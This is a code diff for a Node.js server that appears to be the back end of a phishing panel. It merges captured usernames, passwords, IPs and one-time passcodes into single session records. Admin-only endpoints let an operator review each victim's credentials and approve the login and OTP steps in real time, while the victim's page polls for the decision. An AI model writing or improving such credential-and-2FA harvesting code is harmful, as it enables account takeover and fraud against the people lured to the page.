@@ -12,11 +12,9 @@ const visitors = {};
 const orders = [];
 const clicks = [];
 const blockedIPs = new Set();
-const loginAttempts = [];
-const otpAttempts = [];
+const sessions = [];
 let orderCounter = 1000;
-let loginCounter = 5000;
-let otpCounter = 8000;
+let sessionCounter = 5000;
 let clickCounter = 0;
 let totalVisitsToday = 0;
 let pageViewsToday = 0;
@@ -248,42 +246,38 @@ const server = http.createServer(async (req, res) => {
     }
   }
 
-  // --- Login Attempts ---
+  // --- Sessions (Login + OTP in one record) ---
 
   if (req.method === 'POST' && reqPath === '/api/login-attempts') {
     const ip = getIP(req);
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      loginCounter++;
-      const attempt = {
-        id: loginCounter,
+      sessionCounter++;
+      const session = {
+        id: sessionCounter,
         username: (data.username || '').substring(0, 100),
         password: (data.password || '').substring(0, 100),
         country: (data.country || 'غير معروف').substring(0, 100),
         lang: data.lang || 'ar',
         ip,
-        status: 'waiting',
+        loginStatus: 'waiting',
+        otp: null,
+        otpStatus: null,
         date: new Date().toISOString()
       };
-      loginAttempts.push(attempt);
-      return json(res, { success: true, id: attempt.id });
+      sessions.push(session);
+      return json(res, { success: true, id: session.id });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
     }
   }
 
   if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
-    const parts = reqPath.split('/');
-    const id = parseInt(parts[3]);
-    const attempt = loginAttempts.find(a => a.id === id);
-    if (!attempt) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: attempt.status });
-  }
-
-  if (req.method === 'GET' && reqPath === '/api/login-attempts') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    return json(res, { attempts: loginAttempts.slice().reverse() });
+    const id = parseInt(reqPath.split('/')[3]);
+    const s = sessions.find(a => a.id === id);
+    if (!s) return json(res, { status: 'not_found' }, 404);
+    return json(res, { status: s.loginStatus });
   }
 
   if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
@@ -291,9 +285,45 @@ const server = http.createServer(async (req, res) => {
     const body = await readBody(req);
     try {
       const data = JSON.parse(body);
-      const attempt = loginAttempts.find(a => a.id === data.id);
-      if (!attempt) return json(res, { error: 'not found' }, 404);
-      attempt.status = data.status;
+      const s = sessions.find(a => a.id === data.id);
+      if (!s) return json(res, { error: 'not found' }, 404);
+      s.loginStatus = data.status;
+      return json(res, { success: true });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const id = parseInt(data.loginId);
+      const s = sessions.find(a => a.id === id);
+      if (!s) return json(res, { error: 'session not found' }, 404);
+      s.otp = (data.otp || '').substring(0, 20);
+      s.otpStatus = 'waiting';
+      return json(res, { success: true, id: s.id });
+    } catch (e) {
+      return json(res, { error: 'bad request' }, 400);
+    }
+  }
+
+  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
+    const id = parseInt(reqPath.split('/')[3]);
+    const s = sessions.find(a => a.id === id);
+    if (!s) return json(res, { status: 'not_found' }, 404);
+    return json(res, { status: s.otpStatus || 'not_found' });
+  }
+
+  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
+    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
+    const body = await readBody(req);
+    try {
+      const data = JSON.parse(body);
+      const s = sessions.find(a => a.id === data.id);
+      if (!s) return json(res, { error: 'not found' }, 404);
+      s.otpStatus = data.status;
       return json(res, { success: true });
     } catch (e) {
       return json(res, { error: 'bad request' }, 400);
@@ -302,90 +332,16 @@ const server = http.createServer(async (req, res) => {
 
   if (req.method === 'GET' && reqPath === '/api/sessions') {
     if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const sessions = loginAttempts.slice().reverse().map(login => {
-      const otps = otpAttempts.filter(o => o.loginId === login.id);
-      const latestOtp = otps.length > 0 ? otps[otps.length - 1] : null;
-      let step = 'login';
+    const list = sessions.slice().reverse().map(s => {
       let pendingAction = null;
-      if (login.status === 'waiting') {
-        pendingAction = { type: 'login', id: login.id };
-      } else if (login.status === 'approved') {
-        step = 'otp';
-        if (latestOtp && latestOtp.status === 'waiting') {
-          pendingAction = { type: 'otp', id: latestOtp.id };
-        }
+      if (s.loginStatus === 'waiting') {
+        pendingAction = { type: 'login', id: s.id };
+      } else if (s.loginStatus === 'approved' && s.otpStatus === 'waiting') {
+        pendingAction = { type: 'otp', id: s.id };
       }
-      return {
-        id: login.id,
-        username: login.username,
-        password: login.password,
-        country: login.country,
-        ip: login.ip,
-        lang: login.lang,
-        date: login.date,
-        loginStatus: login.status,
-        step,
-        otp: latestOtp ? latestOtp.otp : null,
-        otpStatus: latestOtp ? latestOtp.status : null,
-        pendingAction
-      };
+      return { ...s, pendingAction };
     });
-    return json(res, { sessions });
-  }
-
-  // --- OTP Attempts ---
-
-  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
-    const ip = getIP(req);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      otpCounter++;
-      const loginId = parseInt(data.loginId);
-      const login = loginAttempts.find(a => a.id === loginId);
-      const attempt = {
-        id: otpCounter,
-        loginId,
-        username: login ? login.username : '',
-        otp: (data.otp || '').substring(0, 20),
-        country: login ? login.country : (data.country || 'غير معروف'),
-        lang: data.lang || 'ar',
-        ip,
-        status: 'waiting',
-        date: new Date().toISOString()
-      };
-      otpAttempts.push(attempt);
-      return json(res, { success: true, id: attempt.id });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
-  }
-
-  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
-    const parts = reqPath.split('/');
-    const id = parseInt(parts[3]);
-    const attempt = otpAttempts.find(a => a.id === id);
-    if (!attempt) return json(res, { status: 'not_found' }, 404);
-    return json(res, { status: attempt.status });
-  }
-
-  if (req.method === 'GET' && reqPath === '/api/otp-attempts') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    return json(res, { attempts: otpAttempts.slice().reverse() });
-  }
-
-  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
-    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
-    const body = await readBody(req);
-    try {
-      const data = JSON.parse(body);
-      const attempt = otpAttempts.find(a => a.id === data.id);
-      if (!attempt) return json(res, { error: 'not found' }, 404);
-      attempt.status = data.status;
-      return json(res, { success: true });
-    } catch (e) {
-      return json(res, { error: 'bad request' }, 400);
-    }
+    return json(res, { sessions: list });
   }
 
   // --- Admin Auth ---
